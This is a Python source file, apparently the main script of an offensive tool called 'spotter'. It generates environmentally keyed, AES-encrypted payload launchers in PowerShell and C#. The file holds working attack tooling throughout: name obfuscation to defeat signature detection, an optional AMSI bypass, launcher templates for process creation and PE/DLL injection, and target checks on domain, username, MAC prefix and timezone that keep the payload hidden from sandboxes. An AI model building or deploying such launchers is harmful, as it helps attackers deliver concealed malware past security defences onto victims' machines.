#! /usr/bin/python3
import os
from argparse import ArgumentParser
import sys
from base.encrypter import Encrypter
from base.obfuscator import Obfuscator
from base.psh import pshTemplate
from base.csi import csInjectorTemplate

banner = """
                 _   _            
                | | | |           
 ___ _ __   ___ | |_| |_ ___ _ __ 
/ __| '_ \ / _ \| __| __/ _ \ '__|
\__ \ |_) | (_) | |_| ||  __/ |   
|___/ .__/ \___/ \__|\__\___|_|   
    | |      v.1.0                     
    |_|                         
"""
print(banner)

parser = ArgumentParser(
    description='This script will build an AES256-encrypted payload launcher using environmental keys.')
subparsers = parser.add_subparsers(help='Payload method help')

# Create the parser for the PowerShell method
parser_ps = subparsers.add_parser('ps', help='PowerShell help')
parser_ps.add_argument('--domain', '-d', help='Domain name to check for')
parser_ps.add_argument('--joined', '-j', action="store_true", help='Check that machine is joined to a domain')
parser_ps.add_argument('--mac', '-m', help='First 3 octets of the target MAC address (OUI) (format: 00:11:22)')
parser_ps.add_argument('--timezone', '-tz', help='System timezone (format: UTC-7, UTC+2)')
parser_ps.add_argument('--username', '-u', help='Username of user')
# Arguments to handle payload execution
parser_ps.add_argument('--payload', '-x', help='Command to run')
parser_ps.add_argument('--payload_file', help='File containing payload to run')
parser_ps.add_argument('--exitcmd', '-ec', default="exit", help='PS code or command to run if the environment check fails')
parser_ps.add_argument('--amsi','-a', action='store_true', help='Use AMSI bypassing (Only use if running Windows 10+)')

# Create the parser for the C# process creation method
parser_cs_ps = subparsers.add_parser('cs-process', help='C# Process help')
parser_cs_ps.add_argument('--domain', '-d', help='Domain name to check for')
parser_cs_ps.add_argument('--user', '-u', help='User name to check for')
parser_cs_ps.add_argument('--computer', '-c', help='Computer name to check for')
parser_cs_ps.add_argument('--payload', '-x', help='Command to run')
parser_cs_ps.add_argument('--payload_file', help='File containing payload to run')

# Create the parser for the CS PE injection method
parser_cs_inj = subparsers.add_parser('cs-inject', help='C# PE Injection help')
parser_cs_inj.add_argument('--domain', '-d', help='Domain name to check for')
parser_cs_inj.add_argument('--user', '-u', help='User name to check for')
parser_cs_inj.add_argument('--computer', '-c', help='Computer name to check for')
parser_cs_inj.add_argument('--payload_file', help='DLL/EXE to be loaded on decryption')

# Parse  argument lists
args = parser.parse_args()

# Set up output location
if not os.path.exists("./output"):
    os.makedirs("./output")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

try:
    # PowerShell environmental keying
    if sys.argv[1] == 'ps':
        if args.domain:
            key = args.domain
            query = '(Get-WmiObject -Class Win32_ComputerSystem).Domain'
        if args.joined:
            key = "True"  # store_true used to make this check that the target is domain-joined
            query = '(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain'
        if args.mac:
            key = args.mac
            # This needs more testing, especially on devices with multiple NICs
            query = '(Get-WmiObject win32_networkadapterconfiguration | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress).substring(0,8)'
        if args.timezone:
            key = args.timezone
            query = '''"{0:'UTC'zz}" -f (get-date) -replace(0,"")'''
        if args.username:
            key = args.username
            query = "((Get-WmiObject -Class Win32_ComputerSystem).username).split('\\')[1]"
            query = "((Get-WmiObject -Class Win32_ComputerSystem).username).split('\\')[1]"

        # Figure out payload
        if args.payload:
            payload = args.payload
        elif args.payload_file:
            f = open(args.payload_file, "r")
            payload = f.read()
        # Encrypt the payload
        Encrypter = Encrypter()
        encrypted = Encrypter.encrypt1(payload, key)
        # Obfuscate variable and function names
        Obfuscator = Obfuscator()
        varKey, varCtr, varBytes, varAesManaged, varencryptedStringWithIV, varUnencryptedData, varDecryptor, varLauncher, funcCreateAesManagedObject, funcDecryptString, sta, stb, stc, std = Obfuscator.varobfs() #a, b, c, d are not used, but needed to allow cs-inject to run properly
        varKey = '$' + varKey
        varCtr = '$' + varCtr
        varBytes = '$' + varBytes
        varAesManaged = '$' + varAesManaged
        varencryptedStringWithIV = '$' + varencryptedStringWithIV
        varUnencryptedData = '$' + varUnencryptedData
        varDecryptor = '$' + varDecryptor
        varLauncher = '$' + varLauncher
        pshTemplate = pshTemplate()
        pshTemplate.pshTemplate(encrypted, varKey, varCtr, varBytes, varAesManaged, varencryptedStringWithIV, \
                                varUnencryptedData, varDecryptor, varLauncher, funcCreateAesManagedObject, \
                                funcDecryptString, query, args.amsi, args.exitcmd)
    if sys.argv[1] == 'cs-inject':
        if args.domain:
            key = args.domain
        elif args.user:
            key = args.user
        elif args.computer:
            key = args.computer
        csInjectorTemplate = csInjectorTemplate()
        encoded = csInjectorTemplate.csiPayload(args.payload_file)
        #Encrypt the provided PECOFF payload
        Encrypter = Encrypter()
        encrypted = Encrypter.encrypt1(str(encoded), key)
        # Obfuscate variable and function names
        Obfuscator = Obfuscator()
        encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
        if args.domain:
            check = "System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName"
        elif args.user:
            check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[1]"
        elif args.computer:
            check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[0]"
        # Replace original variable and function names with obfuscated ones
        with open("templates/spotter-inject.cs", "rt") as fin:
            r1 = fin.read().replace('encDllB64', encDllB64)
            r1 = r1.replace('encDllBytes', encDllBytes)
            r1 = r1.replace('newIV', newIV)
            r1 = r1.replace('envKey', envKey)
            r1 = r1.replace('keyBytes', keyBytes)
            r1 = r1.replace('plaintext', plaintext)
            r1 = r1.replace('InjectAssembly', InjectAssembly)
            r1 = r1.replace('key', key)
            r1 = r1.replace(' iv ', ' '+iv+' ')
            r1 = r1.replace('iv;', iv+';')
            r1 = r1.replace(' cyphertext ', ' '+cyphertext+' ')
            r1 = r1.replace('rijAlg', rijAlg)
            r1 = r1.replace('bytes', strBytes)
            r1 = r1.replace('assembly', assembly)
            r1 = r1.replace('method', method)
            r1 = r1.replace('ENCRYPTED_BLOB', encrypted)
            r1 = r1.replace('KEYCHECK', check)
        # Write the C# code to a file
        with open("./output/cs-inject.cs", "wt") as fout:
            fout.write(r1)
        print('[+] CS File Saved as cs-inject.cs')
    if sys.argv[1] == 'cs-process':
        if args.domain:
            key = args.domain
        elif args.user:
            key = args.user
        elif args.computer:
            key = args.computer
        if args.payload:
            payload = args.payload
        elif args.payload_file:
            f = open(args.payload_file, "r")
            payload = f.read()
        #print(payload)
        Encrypter = Encrypter()
        encrypted = Encrypter.encrypt1(payload, key)
        # Obfuscate variable and function names
        Obfuscator = Obfuscator()
        encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
        if args.domain:
            check = "System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName"
        elif args.user:
            check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[1]"
        elif args.computer:
            check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[0]"
        #print(encrypted)
        with open("templates/spotter-process.cs", "rt") as fin:
            r1 = fin.read().replace('ENCODED_COMMAND', encrypted)
            r1 = r1.replace('KEYCHECK', check)
            r1 = r1.replace('encDllBytes', encDllBytes)
            r1 = r1.replace('newIV', newIV)
            r1 = r1.replace('envKey', envKey)
            r1 = r1.replace('keyBytes', keyBytes)
            r1 = r1.replace('plaintext', plaintext)
            r1 = r1.replace('InjectAssembly', InjectAssembly)
            r1 = r1.replace('key', key)
            r1 = r1.replace(' iv ', ' '+iv+' ')
            r1 = r1.replace('iv;', iv+';')
            r1 = r1.replace(' cyphertext ', ' '+cyphertext+' ')
            r1 = r1.replace('rijAlg', rijAlg)
            r1 = r1.replace('bytes', strBytes)
            r1 = r1.replace('assembly', assembly)
            r1 = r1.replace('method', method)
        with open("./output/cs-process.cs", "wt") as fout:
            fout.write(r1)
        print('[+] CS File Saved as cs-process.cs')
except Exception as e:
    print(e)
